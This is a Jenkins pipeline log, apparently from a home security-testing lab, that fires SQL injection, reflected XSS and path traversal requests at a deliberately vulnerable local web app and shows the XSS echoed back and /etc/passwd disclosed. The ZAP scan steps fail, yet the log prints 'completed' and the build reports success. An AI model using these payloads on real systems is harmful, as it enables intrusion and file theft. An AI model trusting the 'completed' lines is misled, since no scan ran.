# this is the results after everyhting is set up and runnning


Started by user admin
[Pipeline] Start of Pipeline
[Pipeline] node
Running on Jenkins in /var/jenkins_home/workspace/Attack
[Pipeline] {
[Pipeline] stage
[Pipeline] { (Checkout Code)
[Pipeline] git
The recommended git tool is: NONE
No credentials specified
 > git rev-parse --resolve-git-dir /var/jenkins_home/workspace/Attack/.git # timeout=10
Fetching changes from the remote Git repository
 > git config remote.origin.url https://github.com/AL4255/CI-CD.git # timeout=10
Fetching upstream changes from https://github.com/AL4255/CI-CD.git
 > git --version # timeout=10
 > git --version # 'git version 2.39.5'
 > git fetch --tags --force --progress -- https://github.com/AL4255/CI-CD.git +refs/heads/*:refs/remotes/origin/* # timeout=10
 > git rev-parse refs/remotes/origin/main^{commit} # timeout=10
Checking out Revision 9ff1bddf2517f426d52c412a64645489fb9a036c (refs/remotes/origin/main)
 > git config core.sparsecheckout # timeout=10
 > git checkout -f 9ff1bddf2517f426d52c412a64645489fb9a036c # timeout=10
 > git branch -a -v --no-abbrev # timeout=10
 > git branch -D main # timeout=10
 > git checkout -b main 9ff1bddf2517f426d52c412a64645489fb9a036c # timeout=10
Commit message: "Create JenkinsConfig"
 > git rev-list --no-walk 9ff1bddf2517f426d52c412a64645489fb9a036c # timeout=10
[Pipeline] }
[Pipeline] // stage
[Pipeline] stage
[Pipeline] { (Wait for App)
[Pipeline] script
[Pipeline] {
[Pipeline] sleep
Sleeping for 10 sec
[Pipeline] }
[Pipeline] // script
[Pipeline] }
[Pipeline] // stage
[Pipeline] stage
[Pipeline] { (Simple Security Test)
[Pipeline] script
[Pipeline] {
[Pipeline] echo
=== TESTING VULNERABLE ENDPOINTS DIRECTLY ===
[Pipeline] sh
+ echo Testing SQL Injection:
Testing SQL Injection:
+ docker exec zap curl -s http://webapp:5000/login?username=admin%27OR%271%27=%271&password=test

    <html>
    <head><title>Login</title></head>
    <body>
        <h1>üîë Login Form</h1>
        <form method="post">
            <p><input type="text" name="username" placeholder="Username" required></p>
            <p><input type="password" name="password" placeholder="Password" required></p>
            <p><button type="submit">Login</button></p>
        </form>
        <hr>
        <h3>üí° Test SQL Injection:</h3>
        <p>Try username: <code>admin' OR '1'='1' --</code></p>
        <p>Try password: <code>anything</code></p>
        <a href="/">‚Üê Back to Home</a>
    </body>
    </html>
    + echo \nTesting XSS:

Testing XSS:
+ docker exec zap curl -s http://webapp:5000/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E

        <html>
        <head><title>Search Results</title></head>
        <body>
            <h1>üîç Search Results</h1>
            <p>You searched for: <script>alert('XSS')</script></p>
            <p>No users found matching your search.</p>
            <hr>
            <a href="/search">‚Üê New Search</a> | <a href="/">‚Üê Home</a>
        </body>
        </html>
        + echo \nTesting Path Traversal:

Testing Path Traversal:
+ docker exec zap curl -s http://webapp:5000/file?file=../../../etc/passwd

        <html>
        <head><title>File Viewer</title></head>
        <body>
            <h1>üìÅ File: ../../../etc/passwd</h1>
            <pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</pre>
            <hr>
            <a href="/file?file=default.txt">‚Üê Default File</a> | <a href="/">‚Üê Home</a>
        </body>
        </html>
        
[Pipeline] sh
+ docker exec zap zap-cli -p 8090 spider http://webapp:5000
OCI runtime exec failed: exec failed: unable to start container process: exec: "zap-cli": executable file not found in $PATH: unknown
+ echo Spider completed
Spider completed
[Pipeline] sh
+ docker exec zap zap-cli -p 8090 active-scan http://webapp:5000
OCI runtime exec failed: exec failed: unable to start container process: exec: "zap-cli": executable file not found in $PATH: unknown
+ echo Active scan completed
Active scan completed
[Pipeline] }
[Pipeline] // script
[Pipeline] }
[Pipeline] // stage
[Pipeline] }
[Pipeline] // node
[Pipeline] End of Pipeline
Finished: SUCCESS
